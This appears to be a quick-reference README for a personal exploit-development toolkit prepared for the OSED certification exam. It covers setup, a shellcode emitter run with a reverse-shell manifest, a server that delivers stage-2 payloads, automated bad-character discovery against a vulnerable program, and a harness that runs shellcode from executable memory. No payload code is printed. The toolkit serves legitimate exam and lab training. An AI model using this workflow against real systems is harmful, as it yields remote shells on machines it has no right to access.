OSED Exam Bundle - Quick Reference
===================================

SETUP (run once per machine)
----------------------------
1. Transfer exam_bundle.zip to C:\exam\ via SMB:
     copy \\<kali_ip>\kalismb\exam_bundle.zip C:\exam\

2. Extract and install:
     cd C:\exam\exam_bundle
     install.bat

   This installs keystone-engine from bundled wheels (offline).


WORKFLOW (per target)
---------------------
On Kali, build shellcode with the emitter:

  uv run emitter Tools/emitter/manifests/reverse_shell.yaml \
      --lhost tun0 --lport 9001 --out emitter_out/

Transfer the per-target files to the exam box:

  emitter_out/asm/code_snippet.py    Editable Keystone assembly
  emitter_out/asm/debug_runner.py    Assembly + WinDbg attach
  emitter_out/bin/shellcode.bin      Raw binary
  emitter_out/bin/test_harness.py    Load .bin + WinDbg attach


TOOLS IN THIS BUNDLE
--------------------
Static tools (always available):

  badchars\badchar_auto.py
    Automated bad character discovery via cdb.exe.
    Pure stdlib, no pip dependencies. Python 3.7+.
    Usage:
      python badchar_auto.py ^
        --cdb "C:\Tools\x86\cdb.exe" ^
        --target "C:\path\to\vuln.exe" ^
        --host 127.0.0.1 --port <port> ^
        --offset <offset> --size <bufsize> ^
        --breakpoint "msvcrt!strcpy" ^
        --dump-expr "poi(@esp+4)" ^
        --step pt ^
        --exclude 00,0a,0d ^
        --prefix "<prefix>" --suffix "<suffix>"

  tools\recon.exe
    PE triage: sections, imports, exports, protections.
    Usage:
      recon.exe pe <target.exe>
      recon.exe triage <target.exe>

  tools\tcp_stage_server.py  (run on KALI, not the exam box)
    Serves stage 2 payloads for tcp_stager shellcode.
    Usage:
      python tcp_stage_server.py --port 9002 --file stage2.bin


Per-target tools (generated by emitter, transfer per build):

  code_snippet.py
    Keystone-compatible assembly. Edit CODE block, then:
      python code_snippet.py              # assemble + run
      python code_snippet.py --hex        # print hex string
      python code_snippet.py --py         # print Python bytes
      python code_snippet.py --bin sc.bin # write binary file

  debug_runner.py
    Like code_snippet.py but with line-by-line error scanning
    when assembly fails. Best for debugging syntax issues.

  test_harness.py
    Loads shellcode.bin, allocates RWX memory, prints address
    for WinDbg breakpoint, waits for Enter, then executes.


QUICK BAD CHARACTER WORKFLOW
----------------------------
1. Run badchar_auto.py with your target's parameters
2. It outputs the confirmed bad characters
3. Add them to your manifest YAML badchars list
4. Rebuild with the emitter on Kali
5. Transfer updated code_snippet.py / shellcode.bin

TROUBLESHOOTING
---------------
Q: Keystone install fails?
A: Check Python version (python --version). The bundle includes wheels
   for Python 3.7 through 3.12. If your version is missing, you can
   still use the pre-assembled shellcode.bin from the emitter.

Q: code_snippet.py assembly fails on a specific line?
A: Use debug_runner.py instead -- it scans line-by-line and reports
   exactly which instruction Keystone rejects.

Q: Need to modify shellcode but no Keystone?
A: Edit the assembly on Kali, rebuild with the emitter, and transfer
   the new shellcode.bin. The test_harness.py loads it without Keystone.
